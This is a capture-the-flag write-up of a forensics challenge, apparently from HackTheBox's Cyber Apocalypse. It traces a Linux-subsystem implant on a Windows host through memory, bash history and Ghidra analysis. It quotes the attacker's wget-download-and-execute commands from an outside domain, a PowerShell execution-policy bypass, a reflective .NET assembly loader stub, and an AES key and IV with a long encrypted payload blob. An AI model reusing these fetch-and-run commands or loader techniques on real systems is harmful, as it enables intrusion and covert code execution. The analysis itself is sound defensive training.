# Hackthebox Cyber Apocalypse CTF

## Pandora's Bane

### Description
```
Having now the relic, Pandora is trying to create a plan to shut down the vessels. Unfortunately for her, the alien's intel is one step ahead, as they somehow know what she is up to. An incident response operation started as Pandora was sure the aliens had gained access to her teammate's host. Although many compromised hosts were found, only one sample is applicable for further analysis. If you neutralize this threat by analyzing the sample, Pandora will be able to proceed with her plan.
```

### Problem

Analyze the implant on the system and determine Pandora's plan.

### Solve

First, I enumerated the processes, filesystem, registry keys, event logs.  I learned that the Windows system has a Linux subsystem installed (Ubuntu).  Learning more about the Linux subsystem fs, I inspected the .bash_history file and found an interesting artifact.

```
DataSectionObject 0xffffdb8d3deac890   4      \Device\HarddiskVolume3\Users\Rygnarix\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\rootfs\home\user\.bash_history
cat ./file.4.0xffffdb8d3e25a260..bash_history.dat
rm .bash_history 
whoami
id
cat /etc/passwd
ping google.com
ps aux
uname -a
cat /etc/os-release 
wget windowsliveupdater.com/updater -O /tmp/.apt-cache
chmod +x /tmp/.apt-cache 
/tmp/.apt-cache
```

Based on the bash history, the threat actor downloaded a file named updater and saved it to `/tmp/.apt-cache`.

`wget windowsliveupdater.com/updater -O /tmp/.apt-cache`

Reputation:

https://www.virustotal.com/gui/domain/windowsliveupdater.com

I extracted the `.apt-cache` sample from memory using Volatility and analyzed it.

```
0xffffdb8d3debeb30 4 \Device\HarddiskVolume3\Users\Rygnarix\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\rootfs\tmp.apt-cache

vol3 -f mem.raw -p Win10x64_19041 windows.dumpfiles --virtaddr 0xffffdb8d3debeb30
```

I then analyzed apt-cache using ghidra and based on references from main function, I can see that Powershell was used to download a file.

```
powershell -Command {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted}

        001521cf 70              ??         70h    p
        001521d0 6f              ??         6Fh    o
        001521d1 77              ??         77h    w
        001521d2 65              ??         65h    e
        001521d3 72              ??         72h    r
        001521d4 73              ??         73h    s
        001521d5 68              ??         68h    h
        001521d6 65              ??         65h    e
        001521d7 6c              ??         6Ch    l
        001521d8 6c              ??         6Ch    l
        001521d9 2e              ??         2Eh    .
        001521da 65              ??         65h    e
        001521db 78              ??         78h    x
        001521dc 65              ??         65h    e

        001521dd 2d              ??         2Dh    -
        001521de 43              ??         43h    C
        001521df 6f              ??         6Fh    o
        001521e0 6d              ??         6Dh    m
        001521e1 6d              ??         6Dh    m
        001521e2 61              ??         61h    a
        001521e3 6e              ??         6Eh    n
        001521e4 64              ??         64h    d
        
        001521e5 7b              ??         7Bh    {
        001521e6 53              ??         53h    S
        001521e7 65              ??         65h    e
        001521e8 74              ??         74h    t
        001521e9 2d              ??         2Dh    -
        001521ea 45              ??         45h    E
        001521eb 78              ??         78h    x
        001521ec 65              ??         65h    e
        001521ed 63              ??         63h    c
        001521ee 75              ??         75h    u
        001521ef 74              ??         74h    t
        001521f0 69              ??         69h    i
        001521f1 6f              ??         6Fh    o
        001521f2 6e              ??         6Eh    n
        001521f3 50              ??         50h    P
        001521f4 6f              ??         6Fh    o
        001521f5 6c              ??         6Ch    l
        001521f6 69              ??         69h    i
        001521f7 63              ??         63h    c
        001521f8 79              ??         79h    y
        001521f9 20              ??         20h     
        001521fa 2d              ??         2Dh    -
        001521fb 53              ??         53h    S
        001521fc 63              ??         63h    c
        001521fd 6f              ??         6Fh    o
        001521fe 70              ??         70h    p
        001521ff 65              ??         65h    e
        00152200 20              ??         20h     
        00152201 43              ??         43h    C
        00152202 75              ??         75h    u
        00152203 72              ??         72h    r
        00152204 72              ??         72h    r
        00152205 65              ??         65h    e
        00152206 6e              ??         6Eh    n
        00152207 74              ??         74h    t
        00152208 55              ??         55h    U
        00152209 73              ??         73h    s
        0015220a 65              ??         65h    e
        0015220b 72              ??         72h    r
        0015220c 20              ??         20h     
        0015220d 2d              ??         2Dh    -
        0015220e 45              ??         45h    E
        0015220f 78              ??         78h    x
        00152210 65              ??         65h    e
        00152211 63              ??         63h    c
        00152212 75              ??         75h    u
        00152213 74              ??         74h    t
        00152214 69              ??         69h    i
        00152215 6f              ??         6Fh    o
        00152216 6e              ??         6Eh    n
        00152217 50              ??         50h    P
        00152218 6f              ??         6Fh    o
        00152219 6c              ??         6Ch    l
        0015221a 69              ??         69h    i
        0015221b 63              ??         63h    c
        0015221c 79              ??         79h    y
        0015221d 20              ??         20h     
        0015221e 55              ??         55h    U
        0015221f 6e              ??         6Eh    n
        00152220 72              ??         72h    r
        00152221 65              ??         65h    e
        00152222 73              ??         73h    s
        00152223 74              ??         74h    t
        00152224 72              ??         72h    r
        00152225 69              ??         69h    i
        00152226 63              ??         63h    c
        00152227 74              ??         74h    t
        00152228 65              ??         65h    e
        00152229 64              ??         64h    d
        0015222a 7d              ??         7Dh    }
```

Powershell was used to download a file from the same remote server named UpdateId and saved it to `/dev/shm/.font-unix`.

```
                             DAT_0015226c                                    XREF[1]:     main:0010be80(*)  
        0015226c 77              ??         77h    w
        0015226d 69              ??         69h    i
        0015226e 6e              ??         6Eh    n
        0015226f 64              ??         64h    d
        00152270 6f              ??         6Fh    o
        00152271 77              ??         77h    w
        00152272 73              ??         73h    s
        00152273 6c              ??         6Ch    l
        00152274 69              ??         69h    i
        00152275 76              ??         76h    v
        00152276 65              ??         65h    e
        00152277 75              ??         75h    u
        00152278 70              ??         70h    p
        00152279 64              ??         64h    d
        0015227a 61              ??         61h    a
        0015227b 74              ??         74h    t
        0015227c 65              ??         65h    e
        0015227d 72              ??         72h    r
        0015227e 2e              ??         2Eh    .
        0015227f 63              ??         63h    c
        00152280 6f              ??         6Fh    o
        00152281 6d              ??         6Dh    m
        00152282 3a              ??         3Ah    :
        00152283 38              ??         38h    8
        00152284 30              ??         30h    0

     
        00152285 47              ??         47h    G
        00152286 45              ??         45h    E
        00152287 54              ??         54h    T
        00152288 20              ??         20h     
        00152289 2f              ??         2Fh    /
        0015228a 75              ??         75h    u
        0015228b 70              ??         70h    p
        0015228c 64              ??         64h    d
        0015228d 61              ??         61h    a
        0015228e 74              ??         74h    t
        0015228f 65              ??         65h    e
        00152290 49              ??         49h    I
        00152291 64              ??         64h    d
        00152292 20              ??         20h     
        00152293 48              ??         48h    H
        00152294 54              ??         54h    T
        00152295 54              ??         54h    T
        00152296 50              ??         50h    P
        00152297 2f              ??         2Fh    /
        00152298 31              ??         31h    1
        00152299 2e              ??         2Eh    .
        0015229a 31              ??         31h    1
        0015229b 0d              ??         0Dh
        0015229c 0a              ??         0Ah
        
        001522b2 2f              ??         2Fh    /
        001522b3 64              ??         64h    d
        001522b4 65              ??         65h    e
        001522b5 76              ??         76h    v
        001522b6 2f              ??         2Fh    /
        001522b7 73              ??         73h    s
        001522b8 68              ??         68h    h
        001522b9 6d              ??         6Dh    m
        001522ba 2f              ??         2Fh    /
        001522bb 2e              ??         2Eh    .
        001522bc 66              ??         66h    f
        001522bd 6f              ??         6Fh    o
        001522be 6e              ??         6Eh    n
        001522bf 74              ??         74h    t
        001522c0 2d              ??         2Dh    -
        001522c1 75              ??         75h    u
        001522c2 6e              ??         6Eh    n
        001522c3 69              ??         69h    i
        001522c4 78              ??         78h    x
```

Further analyzing the payload, The payload is opened and base64 decoded and then decrypted via aes256.

```rust
std::fs::OpenOptions::new(&local_430);
sVar4 = std::fs::OpenOptions::read((int)&local_430,(void *)0x1,__nbytes);
std::fs::OpenOptions::_open(&local_618,sVar4,&font-unix,0x13);
base64::engine::Engine::decode(&local_430,&DAT_001522c5,&local_618);
  
<alloc::vec::Vec<u8>as_hex::FromHex>::from_hex(puVar11,"99b97bf329968477cc3aae5dd24fdc12a04177b98f66444e03a9a14c2b1758823a85861eccaadc8ecd4f36d201a510ce\n        $bytes = [System.Convert]::FromBase64String(\"\")\n        $asm  = [Reflection.Assembly]::Load($bytes)\n        $method = $asm.GetType(\"SecurityUpda te.Updater\")\n        $method::run()called `Option::unwrap()` on a `None` value/rust c/d5a82bbd26e1ad8b7401f6a718a9c57c96905483/library/alloc/src/collections/btree/naviga te.rs/rustc/d5a82bbd26e1ad8b7401f6a718a9c57c96905483/library/core/src/slice/iter.rs");
              
<alloc::vec::Vec<u8>as_hex::FromHex>::from_hex(&local_430,"3a85861eccaadc8ecd4f36d201a510ce\n        $bytes = [System.Convert]::FromBase64S tring(\"\")\n        $asm = [Reflection.Assembly]::Load($bytes)\n        $method  = $asm.GetType(\"SecurityUpdate.Updater\")\n        $method::run()called `Option: :unwrap()` on a `None` value/rustc/d5a82bbd26e1ad8b7401f6a718a9c57c96905483/libra ry/alloc/src/collections/btree/navigate.rs/rustc/d5a82bbd26e1ad8b7401f6a718a9c57c 96905483/library/core/src/slice/iter.rs");

libaes::Cipher::new_256(&local_430,uVar1);
libaes::Cipher::cbc_decrypt(&local_6a0,&local_430,CONCAT44(uStack1628,uStack1632),local_658,CONCAT44(uStack1660,uStack1664),local_678);
```

AES256 requires a 32 byte key and 16 byte IV

```
99b97bf329968477cc3aae5dd24fdc12a04177b98f66444e03a9a14c2b1758823a85861eccaadc8ecd4f36d201a510ce

key: 99b97bf329968477cc3aae5dd24fdc12a04177b98f66444e03a9a14c2b175882 | IV: 3a85861eccaadc8ecd4f36d201a510ce

key: 99,b9,7b,f3,29,96,84,77,cc,3a,ae,5d,d2,4f,dc,12,a0,41,77,b9,8f,66,44,4e,03,a9,a1,4c,2b,17,58,82
iv: 3a85861eccaadc8ecd4f36d201a510ce
```

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('Space',0)AES_Decrypt(%7B'option':'Hex','string':'99,b9,7b,f3,29,96,84,77,cc,3a,ae,5d,d2,4f,dc,12,a0,41,77,b9,8f,66,44,4e,03,a9,a1,4c,2b,17,58,82'%7D,%7B'option':'Hex','string':'3a85861eccaadc8ecd4f36d201a510ce'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=cUJmOENKZDIxamRWSFZEQVo2cWpNV29kdEl0OXppRmMxUzF6NEEvU1UxUlpNb1lnd05icmFuRVBpQXJCVFZuekxwd2liQ0ZkWGFxV2VhU24vSVlzVlN2NURFVzQrVERzdjlwMklRSjY5YzlBb2lORitZWEs4NjNtR1hHT0FhTEUwYTloTUZDdWhFM1BKMUUwZnliWldWYzNxYXlmUVhKZitXZHNrM1VjMTY4NDdYZU9WaDY2MGRuZ2l4YjY0YllxenVZQUowMEhHci9STCtORkhPamtPZllxelRJdDVGQWxUZjExOVNqNGlGTmJIUjhLbFpQa3NETFZZQXljUXV4OE04di8xcjdLOG1qdzN4NzJRMjVYN2Fwb1FwdG5Cc3FPbXRmTmgzSnJTQUNxQkpVZFh1QlVWVjdabVJUdGlHYWhDRFdtN3ZzYjJPbGpUNUppSXorSXNsaGtoWVlYQmwwN0pyRDlQc1FqOEhvUGpOTy9WQWxyd1l6RDV0L2piNmpFUCtuaGg4K0lUbXZHY0lDTlV6bDVWTFlIZWNISnNMUkx0alVOSkxZMHhXdFdjeFJxSEVCMVhFays4N01hUXZXMmF4V2NHOGxDdFg4cVBzSXNJT2hJYXZ5YkEyK1k1Mkh0cVBFYVRKU1ROdWp6eVlsOTFFNzBPU3pScEl2TkFQNG9DVmtRSkN6WUZUaVdkMERtQnlnRlNjakpWWDBIS0pzRjNqUVo0UFlaTWZ1N2xNY2x4angvU2lxWVJpbUV6b0dCVGNOcllTZlh5VG9Zb3JkL0sxNFQ3YU84MFcrUW44MDF5bFBnTEhUYURJTG92REtJNDA0Q29KbU1vbHBZcGc3TFRKc0dJSnpxRUsrdysyOGxmL1ZrbWk0OVFIL28wbjUyblZmYzZDd0l6cFJIajhMNjZrZVUwSDN5MEJmUTNEQTE2SERDRHdPSXVQbEtuczBYZzZUWFM5OTlxMGlaZndjcCtIRUJ3S21nT0ZZcFUvQ2pSUm8xRFZzd0NrazFFQmFkYXEvS3ZkcmtpSXYrWjBpZG9NaWh2UVpoSXA2a1NoZ0hBZ1k3S0NOVnVwUGlUK0tjZzVzMEhqdmFPclVkL081VVl5eE92R0JreDlmWmphQU5oVUM5K0EwMjd3ZlJpc1Ezbk53b1RtRU1ER3FhSVFKZ1pVb1lGM3I1SWNSRjFmR3hrTk5tZDZvSUYwTHZDOG1WWTQvdXFkYXgzWmNRRmZST096MDh3a3RQVHZXMWhnWG9JVEtqZmZ0L2dpMEJwRHczbXJCQnVBQ3E5SVRVT1JKU29Xckx6dG5jZU9tT0dhK2V2R2lwNkdSeXpLbEF2TVNRcXhQVzRHU3BQcGQ1d0JXS0VieS9TcktPWUtueEM0UDN3UzBiT1V6OG9RTFZBTVlSUDIva2ZsY1pVZ2ovSWExQlY5TTBMaXhYVnpsN3FyNE5KaUp0MUp5QkZ1VjB2eEVUeWpSZkJIeElYem5TdFRrRFpkQkRUbXRBckU1YXgwV2JFS1pZbzJSZEJwRzdrTGxpdFdmaTlkeU5YMkNHdUhFZHZWS0FYVmNDSkVVQ1ZPMVB0RWVhMUpOUTdiaTlnSE1YWjFMb0tDTGcvSDJvWTlpY0JXNlpMRjNNcG9zRXFGZnp0Z3NmZnFmN0pWUDM4MHk2Z0ZLUkl6T2t3b3lEaFFMOS9PNzdidTlvRnBRMUY5N1kwQXNURnZGUUs3clJZS29MQTY2OEJIQWZkQTJTOUZXNnIybExhTGhKUTEzMkcrWUE4OG9DRzIvYVB1SDVlY1BKOWFYUnBIcnpDM29kamdLQ3JTU24wd0lsRHdsVXRHcTNQOW5BSjEzelN3b1lpUm94WmlhVUFXOEtkZFNOUkYwY0ZZbXlJempJbGQyQ3ZrVFZBT3JaeGQvcmpFUDNkcDE1ejVuem94M1ZBcHZiSmY1N1pmUjFDVkpVckNmb29oVlF1aThQb3phcEhmSjdCT05GdmFmRllhcCtHbW1PREtUTy9IWTlVRnNTNlF0R1UvSXc3UVR2NlpucEFva2VKdjUwdWdEOEVGZE1tNE1jWFFmWDBmY3lsZ3dnZkUwVUE1OEZpZ2NQS3VZQWJ3VmNQVjYrcExwak5vVjRDTDk3ZzBhQVQzbmJvRkhaTjNmN2xFblJ3TGRIUHZOQUFud2xaa25iSHpOWmk2T01rOGk0cXgvL0pYUDQvUXdFbTFjb2RabUYwN0Q3TG9ja1B4b0dLSEtkWGxocm52cnpUaXFZeU9YMmVyd2pFVTZhQjAvWG1CRkhnMVd1SWZENzJGTXgvVnZQNWp2dGhWd3dNTTlaT2liSVlma1M1WWdUM3BlOG1paXFrNmtGc0ZxWmdzUXVRSjIvc1lEK2xCTzUreXlGZUNKOFo5MUllZTRBSjVIRVhqRWxnY1hoQ3lteVlYaGdxRjlIWmUxeHQwTXdpYnMzZFowSzU3eVpKSEVpZWV4WE5qM0hCS1JDSjAzME5pV0lXSnNEVW51ajdJYVdmZDFVTnVDTmlSZWhiYzNqM3pycUpjT3laYzQ0b2o5MjNjdUlGcWRla0Z0NEpSdkp4SnNFUGNkeVRoSnRHYjhCQUY2bDgrcEpBNDBPTEFVYldpdGt2VU9iL3puaDlWS2lvREJ5d3BMNHJMUTg3TlQ3ckRYZ1NQTmZLU05jS1dBck5tOEVtTVArdmNzRmt3bFVLSnFCTWxsYVBEdzZqRWVOMGVDUG1kcEFFYWZ2MThobHJYZGc1UWlIZFVPK0doVWZWS0xOczZkV3Vmc3dnaWlYZHM4L3AxVHM5SXNGVGhHVDk5dGEwaXFKUUJSNkJXaEZ0d0ZqUVlGZHFuRGNQek5zcytJYnk0bHQxelB1V2I5ZVNnZ0dMeWdiT2ZhQjVGRXg2ZDJNbWJEUHZ2NUgyWnpVWWRDLzBuWDVFZk9rbEhpZmV1MXA3VjhLVVp2VUI2L0ZQUElQTGdQbktnLytMUUJsaEpmdHRBOHpFVUpjUEdzcFkxb0V1ekxJeVhsT0xVMExyUTYyWCt0MzArN0o4T1NVTVJiM0k4SitHUmhVMnZxcTRNZzBmMVp1cmJJY1pFMExDS1FrS2YwamgwSkRFbTd2ZE15c0lwN1N4a1FMY3V2L2J4RE9Kdk4vNFZhalUxMndpTiszaUk4SEV0eWZrMWVkY01ldEhDUk5kT2JVM1FHUDRSZlFnY2t5NnRkZUlxaC9oQlVuYnVoTU9MZFcyNVBrRHQ3N3BJYlR1bm0rN0xlcFhkRTM2a2hkT2VsZzdpQVgyVVRFZlVZSjV6NDJyWCtoZlUyOXFOOExya1NPSGxxeGpUQjB5UFlENXhGWEtFblpuREJVWlhNQWFsUDZDU1JQN3Axc1ZKZGMwTTg2Q0VGQUFCNDNXMkJTZUQyVEJSYjFGeWlKdUJZVkcxR1ZQemMySGkwMlVZYk5zUmJlaGJmeVFkcGd4WmEwZ2drWnJXbVZJbXJVMSt6SCtjMXZFUFNnazBoT3hkWVVHeVRpLzZmaFRNWG1vRE5ieEdqcG13ZW1RaFhXSmNmRFBMb2pybEhMNE0rcG04d2F0VE5EZWZGQ2p0QW9kQmd0MzhZemJYb2FkbUpNazY5VUYrcC9uY0RDVUswOXNwQTI3dytaTDl1RUdZTlBNcFpSSkF4b2crelI5ZUgrZERoZGprRDRYNWd0MVdGbHFmNVFVdGp6TlMrc1lZVkdiZlpLNGp4ZEpiZElqbjhBbEFBeG12T001OEQ5YUZZb1hyanV6SlZUa0Jyck1qK2lVclNrS1c2cEZmZ0MrNDg0bW9WbkovRlFSQUpFUThBRmQwNDhZOXVTOUdsTm9TMHNCK2owU3gwc09LTlNUUlBEZTRwZm41Vkorc2VMUks4ZmNTa2YwTi84M2t4N3F1M3BOcFV0RkhMd3c4S1VHV3JlcGwybS9XY0hTZy9EWVFsbHNhbG5oMGQvUUlkci9ROHhEaWdPNVlEckVLeTZVMWNNZ2VMSHFXZlNYbjQvY2E2dnF5b0dxTWduL0VVTnZQblJma3MzcWpoR3RQSExDV0grZy9JKzRJaW9SaUVEM21oUTNOZm85RXpiL210dVhzTFhYbVdJTGd3MlMzQlUvam5LbWJWRUZ3a2gzQ3poZzJDT21BSDBwVlZQc0VpTzdRSXk4ODBNWUtBVGVtK2d6aHRFVXVOR3RGbkJCcTdVekExR0JaQmJXY3o4ckZ4YitZYzdrRy8yMkVHSHJZQlJvenJUcVRxNnh2eUhhOXdmelEvK0I1UGs4TUpnRGVyYmZ1WUhLZGtMSEU3dUpnWkpuSDNlaWFVV1pFZmxneVphdUhBQWkyK29yQWtOcTFkU05aMG50T2xmeGlpb2JNZmRHUFZiYW1TNjAxLzFmejVBRWp2VWc5a0dmbjFnNStZdjZUaHh4RjY0SHU5eXVRYUhZT2dMejl4SmJYMEJ0VUZNUGREN0tSMktiWFlIV1hWcUJyNFpQb28rbGkvdnpnRUpOeXVML0c3QVhaR3RSMFFkcEl4dHlUamJpOFdpcExNanNRSlFicCthQVdwRGVldHVEYjVJWlBnWGRpcHNrSkxnaWpEeExwL1lZMkdNRDFCNzF6YnB0THhkVktFSmRZSTZXaVI0bTBTU2dWaDAza29YcCtmM0pzZDdTbjRoVGpoSk9YNWNyL010Zzl0T0RtSXhCa2FDeVBweXRGblYveldKN3cxa2xxTmVIS1hSS2d3TlVPaVE4YXpNdy9WcGRKYk9ia1pGNFpacmJVV1JlQWVEaElJMUtTaWQza1lMaUdKYW1KdmVOenBnTEJRM0RWV0dmV2RaeVgxZlBlNG1GdjdKVnB4akNUM0ZBK2hPeUVFVi84ODh0NUdKdWE3enNwVERYTVVtU1FXT1lwcGwrNTd4NE5HR2pRdGdoZE9YTUsvWXdoaXliTVJvb3pmek1wUFVBUWhmZitKRzZFZzZSUVFMWk5QVXEzYXhLMjYrV2loRk5kbDV4c3JueFJTSzNUK3hGR1NnWGV2SHRUbEhJL0lXQVl3TzBsSW1ZV29xK0JId0llUktaSWVFbmNaYUpnc2lBOFNoWXhoR3orTjU5UVF1bHc1M0lKQUZsWTJWVkZnV2ZmZ21lTCtFMG50ZWFTUkZjL29qakpnckIyWDF2QnI1eWRaejVjUGpjWGxUampuN0VBa0pDODFmQ1M4cjZDbk9CTy9vVE5Ua3VSRlJHUWFQRXdudSthWXFnZlV2dnFKeURKTGdwUFdsQjlvNHd4dmpPR2dRZUt5dDBhYSsxRTh4eTFEaEJOU2hidlhPdG5PanRYenhUMGpnYkJ4TjQ0TXArWnIxZkw5VVVlbnlneWxOZDF0dzRmaFgzYVhDNVJCNnd2S01RdGc1NFExeEJOR1VBRlgvQkR6NytadU1iUHJZVUVEa21FZ0pSR01Zc2N2Q2dDM0VMb0UyM3dkc1duYWtUNGFsWENrY0FFQUZDcGZtRHZGVGRBbHZ6bGFENytleUFpelB6TEVvUG94QThIdmp1d3pHUVAxeVFvZ1ArTG95K3R4Uy9WN2owVVo3WUVmb3JOc2NGN2dLc3EyME85U1E2Ni94aVIrK3k2NHAxRTYvNkpTQVdYbWFGRjRwdWl5WlBsbmFTZ1BGY3orM291ZHNZQ2FaUGl5Mnk4bEtjMndhdWY5Q3UvcDVZc0l3enVCS0EzQWdXN1hjTy9MVEkvYk9NZ01EaStCZ255eHFnZnZMWlVsNTdKVFpqYlVXTTB3NGdPMGtWSks2S1pFOWYrVG9wRGtGc2xqVmo0Vyt0eW5uWlVtSEV0VFRSbGFISGI3K1AwdXYxUEQxVGZSdERpOUJUWW5GajFMbFZhUHNINWNiYlp0NUJwZ2djaWNhcnhGdUJTSGVyL25rRnRsR3EvaThQaVJQYzg3UGdxSUE3L0dZVy9QQlRJbFR0Vm5kbE1IRE1nR1pmcmNicEQzVTNNc1IyWWdldUZaK21YMHg5MEs3MERXU0NNT3dnSHdzRzk4aXozdUJBNElOUk5mWSs5MkI4N2pocmZnS0lTTEFWVzkwTVdiaml5bUdDd0JQaHVGM0h1QzdRY01OazdyMVgzMVpyeUdLWXp3ZDJCaGJud0JTUURlWWdQaGFQcEtwRDd4KzAwYzl5TWNmeFpUY2VWOUUwNkRXTTlIelNZa2sydDhpaU5MU2swRHlHNXRyeW5FQzlwQ0FESFBQQXhyajViOXNKRHFWbzF2K3NkdkJNOGNOSS9aemdBODlKMlptT215TW1uVmxNbC9UR0hlOVFQRFBkTDdhWDZ4NUl2L2pJOFMvTUJiRjYvWGNzNFgrbXlKTkdsbHlaN3lneUEyUlVKSWlzZHZKbGV2bVRtaTRUcjNHdWpwM2JETFJUOUVCN3lDM3FaVGYrSmErWDlhU0tCMUdaRjlYcTE5WHB1bnJUMEo1dm8wV0MzVmJlRW5pOFZ4NVpOYndTUkcwRXUyb3BpUDNEVnRPY2lsaTE0WVRQaHZvcFA1NzNSREc5ZlhvMFJVam4rbk55bkEzTVFDM1hObFhscHlhNGNlZFhzcnptMHMzOEVFbGpxZm5MQmo1aEp2WlcwOWlYTFlNUXJaWHpIMVdZUms0TS85eUwwaFBSbFNjM1FyRjJ4amJFbDBRb1ZZUW5yczUzYlZxdUhFOGRjL1BOdVVZRE1pU3BUZlhrdEthdVJBQ0xNSUkrb2tCSEVQZlFvUWtyKzl2MFNtN2VGZ1hrUFZ1YktFNyt2UVl3S0tpcmVrUUlEdmhBUlNKQTBjMTdTTmJLazArSXE4dTlFM0l4TlZ5dzFub1ZoRk90Nyt3UkQ4aWoyNkJnbmQwdzBnVVd5K0Y5UmVJdmhtOFVvdkMvYzlIOU84aEozdjNrMDNVbXBCZnFRS21WemxBTnNCdGRwZUlEZ2llNkZNU1FhRVBSNjg3SFJZVVdtZlh2ZmNIOVRFOUZUMkgxS1FQdHpORjZmamRxTDRZRW1QazZkNUE5MEZkT3gvL3NYUmRiK0M2dURZUWNMamVlVFZyWFVZbzVZM0N6aXZ3endncjBOVmZ5Z01jY0tqWVg2QzhULzVhbExtNzdpTG45aTNEQXR3WUlwK2d5TUdCNTlSSUdjMWdLb0wzSWUrV3ptOEhQUmdSOHFZcGFHd0pySmM1akp4anQ2MFZScE1RWnhjQWZOOEZCUk8vdmhqUjN5RlAwYXlFUGNSbmlrS2E0YVdhaWFIQ3R5YjNhSHZIdjVSODY1QWIzempBK0Z1VVVHcUhyNk02V3M5YVZ2UWtwdUROcVVvT21FTHpEUmZ3bjdVdGlwNWVqS3FJZVpBVWdBdzlReEU0ZFl3NWcxUEg0dEV4ZzhVa0N6QitVQmZuZ2pJS3dBUWFla3RIbkxiNzVVMFRxZk9KdHRPQkxBVTNtWFJkamVvSlMyYmpmRGl1bENHTkNrN212Tmw5ZDh0M0pjZFY1ZC9yVUZBV3dUQXpjNUtaU3RYUFpKeVg1T2VpSFVtd05IV2N0ak9oU0hBRHlBcDVDYzVJOVJlNXFkNXBGWmtwek1weVF4YjJ6a2xlSE9JTUpzOExRQlB4UEZWdGNtT09IRXJ4MjJNTkFaMm1ldkN1Y09tNElla1pvUkJSdmE1SlNKdDl0SGVGQTdXT3VSemJ5UXFvOE0zQ3NsQk1pbFdSdVF5eTBWUkZ4VjhFa3JGNjNvYXRPRk9DeC9ma2swR0ZCZE9lczZCQ3YwM0hxMTBqNTloOE9iRUVWbTNzbkpZR0UwVzhHTmV6dERFNFdIT1FiZnpIckpYT0hLTGJqSVZHWWdVQnJyc0RLeG00MUZxUE5DNXZ1YkFsNVEyeVUxZXBSOVRYV205emgxTWR3OG5XSGJ6dy9uRjdZNHYyeFRtSC9ycXpZdmFFaUtEeGpLWCtzaWJRb1lMc2hXRzFLVC9JL2ZkOVIzUUxIYTNkVG5DSzZob2FxY3NsT1dudkRyTW5GdDF6Y1Zaa3k3ZXM1NHZHV0tueFlaUzRXclpOYzdDcnY1ekZDTFBCRmgvRExNYkhNVGZNaGNJTjBJQWlJQ080U01DdlpSa2JzUGwxVGV5d1JJbDRrc1ZHbFlINGRpWDh1Z1gvOVlNUVUzTHJRVHI1RTMwZWJpQ3N5MW9TTWVJMXUxdnNwb2JMWTAvbXRGR1pxM1EyTEZlYXFFSWRTa2lQc0twS1Yzc2t5RHhiMHhKdEFxNU1qUUlZalB4Tk1ndjRJUEpobVlFQ2RtbjkzM29KU1JENVh1RUpsMGNPNnFJamVOTjQyb1hJVXlMWGsvdmdPM0ZMT040VEs4YjJpZkNGb2R2QUhzVk1Ma1drMEZkOFFmb1RXblN2WWF5U2NKZThjZ2pOV1ptZ1NiUzVucW9HSWt5REthcnlXQmg3UlZVZGFwVmJBMWRkbzNhNy9XREFraXlqK1MzeXFjaitNY1M4TCsyelFUTHNDdTByZ0dXc3d1VjVrK3dVVkhyNmtxVVVUYXRXdlFhUFhFNER5bVB3emF1UEg4OFJBTm0xdFpoQUZESG5aSW9yTFVQdi81dUtmMk5QNzgxbzVLVmphbStYVjFCMlMzTHV4bUNtTGlrQy8xZ2VyZCs4MHNObFphengxUG5hUnNsaE93VDZWN3pXdHBMUzVxak5idnhva1llQkZtaVJvTW1QdXZrNjhFTEt1b214c0o5OVRQVWVjQ1dMR2g5SkNVS1VsdmtMSUZ2b2QyWWI2T05xajdpaTlsY3RVSlpGVGNZdUlTeUxrR1pwNUE4QXo0VEQ0WnlWaWRFS2VtZThsM053cmx2dEhQdEZ4N3JEYmZ2T2YxbnBZazVmQVRieEVTT3hGazI0ODF6dzhkd3NlT1cvaG1CSS9qbmp1MzV4eEgyWkxVdzlIUE1nVkRuNTZiSFd6bEtqaERjOWkyYWpwdVpYanU0SEpTV3RyNkVPTHk1TlB1LzFRVjZlQ1R1ZnFjdDBYeVBUVzlwOU5CY2dxY1o5RGROcGJ6RXJRL1hwTmxwdldyNUZjSkVPQ0FWN1BlVmtkRElubFVaV1pWT2cwTTYwZU9YTm9KaUtzdzI5ZTRIQkM5VmcxVUFKTDk3S1BNUkVDYng5ZlEvRThnUVBoOVhQOHZQUWVyOHY4bCt0YTlQSmZvY0hXdEpqU09NVVN1TmpwWk9pVFMrcmJwSGdBcG9OTjBic2tqcURabXlvQmI4WjJkcnAwZ2M2VktDVnpoSWpxK2tVTjZEVmpLeFdaQTVVT2MrV3lCbGFQVlVsZDRXcEZGYXdhL21wZWR4SEMxK0FqZTR0T2VZVnNoUEs2QXpwZEx0RmtUTzdnallYd2NtVjRMY0UxbzFoaXI1R1Y1UXdVVE5kdHppbFNHMkNkSVRUbElOTXFBV2duV05ZQVBhblE1dnVvcXdtd1pIWWxydlpPY3YzandNeURXYlNhY2RHMXVpeEFPS3NvcmltUStaREFPYTZlcm1lbDVZVzMvRk81YVVMcWtqYXpOb1czZVRtL2M1WVo4bnVSVSswcGh3ekowK0VFd2VncnpwUFRFcTc5cmVmUExrNUVZaGYvUmVqK1p0RDZLWklLMkdNWnBld1dHQnFYeU9JVm5SSWhCUWtIbHpFM2tVZkQrVVE0Q1NkNFJxaG1VeUlGbk8xNUxmWHhtWTlla054akZUR29QNVpjV2ZzTjM2QlpzYWJrWkhZcUQzT3JpS1dmZGFaSTUwYXlPeW05UThLL2FZN2Z6M1JuOW40U3o0WWV0blQ4ZWhoS0Nzb3pCdmZQVlRhcEFNTlZzVVEvS2ZSTnFaVUswclFUQ015L05rdnlSUFQyRnBIMkwwa1VUQ01BL0gyaFEwUlFpbGxvcnFnUGN0cmhGaE1XT1BnR202WnNaejN6UzNBZkdkUEJTcUdOK3BBcXRoWHFlVDBLVUwwTUU2UEVoK0NFRzVtWVZpTkVkLzM5Z2ZScC9GNkVUUWNNYlFBb0dUZmFGVHZ1bVZXbG01engzV0JHWlZzcURBUFdhTmRDdGlJa0xUSERNQXU0RU5lZnVZVy8wenpadEZFdHlmTjg1SXlhS2VQeHVWU2o1TFVLd1Y0dUxySS9MVVAvVHJEUEFjaWVGRGl5b3ZaZ1ppREpxWUVaVTV2TWlUaGFPcnJPNSszRDBnc1VnaGVlLy8zVUN2TUtNK3cyWWtxandzL0MvMkR3ZWdxRWlJSkgzVDVXVTBPVCtLSUJwOVRmZW5md3pBcHFQTWdqMzI1YU1aNW9hczMyYlMrZ2ViMmdFc1dJUGVr